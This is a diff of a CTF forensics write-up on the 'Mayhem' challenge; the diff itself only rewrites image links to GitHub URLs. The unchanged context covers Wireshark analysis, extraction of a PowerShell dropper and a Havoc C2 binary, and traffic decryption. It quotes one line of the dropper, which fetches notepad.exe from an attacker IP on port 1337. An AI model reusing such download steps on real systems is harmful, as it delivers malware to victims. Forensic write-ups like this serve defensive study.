@@ -7,7 +7,7 @@ title: Mayhem CTF Write-Up
 
 Ever cracked open a PCAP and uncovered a full-on malware operation hiding in plain sight? That’s exactly what this challenge was all about. From suspicious PowerShell scripts to sneaky HTTP traffic and full Havoc C2 decryption, this forensic journey had it all. I’ll walk you through how I broke it down — from protocol analysis to automating the entire decryption process with a bit of Bash magic. Let’s dive into the chaos of Mayhem.
 
-![alt text](/Mayhem/image-12.png)
+![alt text](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-12.png)
 
 
 ## 📘 Challenge Overview
@@ -24,9 +24,9 @@ Ever cracked open a PCAP and uncovered a full-on malware operation hiding in pla
 ## 🔍 Initial Network Analysis
 
 1. Opened the PCAP file in **Wireshark**.
-![alt text](/Mayhem/image.png)
+![alt text](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image.png)
 2. Navigated to **Statistics → Protocol Hierarchy** to understand the traffic distribution.
-![alt text](/Mayhem/image-1.png)
+![alt text](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-1.png)
 3. Noticed a large amount of **HTTP traffic** — a potential channel for C2.
 
 ---
@@ -38,14 +38,14 @@ Following the most active HTTP streams revealed:
 - Two files were transferred:
   - `install.ps1`
   - `notepad.exe`
-![alt text](/Mayhem/image-2.png)
+![alt text](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-2.png)
 The PowerShell script `install.ps1` initiated the download of `notepad.exe`.
-![alt text](/Mayhem/image-3.png)
+![alt text](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-3.png)
 Using **Follow HTTP Stream** in Wireshark:
 - Confirmed the download behavior.
 - Exported both files from the PCAP.
-![alt text](/Mayhem/image-4.png)
-![alt text](/Mayhem/image-6.png)
+![alt text](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-4.png)
+![alt text](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-6.png)
 - Rewrited `Install.ps1`
     ```powershell
     $URL = "http://10.0.2.37:1337/notepad.exe";
@@ -63,11 +63,11 @@ After extraction:
 
 - Generated the hash of `notepad.exe`.
 
-    ![alt text](/Mayhem/image-7.png)
+    ![alt text](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-7.png)
 
 - Checked the hash on a **Threat Intelligence Platform** (e.g., VirusTotal).
 
-    ![alt text](/Mayhem/image-8.png)
+    ![alt text](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-8.png)
 
 **Result:**  
 The file was confirmed to be malicious — identified as a **Havoc C2**.
@@ -94,7 +94,7 @@ Conducted research and found:
     ```
 
 - Used **CyberChef** to manually decode the first 4 C2 packets.
-    ![alt text](/Mayhem/image-9.png)
+    ![alt text](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-9.png)
 
 ### Observations:
 
@@ -161,8 +161,8 @@ To automate and simplify the process:
 
 This enabled complete C2 traffic decryption.
     
-![alt text](/Mayhem/image-10.png)
-![alt text](/Mayhem/image-11.png)
+![alt text](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-10.png)
+![alt text](https://raw.githubusercontent.com/gobloo/TryhackmeWriteups/refs/heads/main/Mayhem/image-11.png)
 ---
 
 ## ✅ Outcome
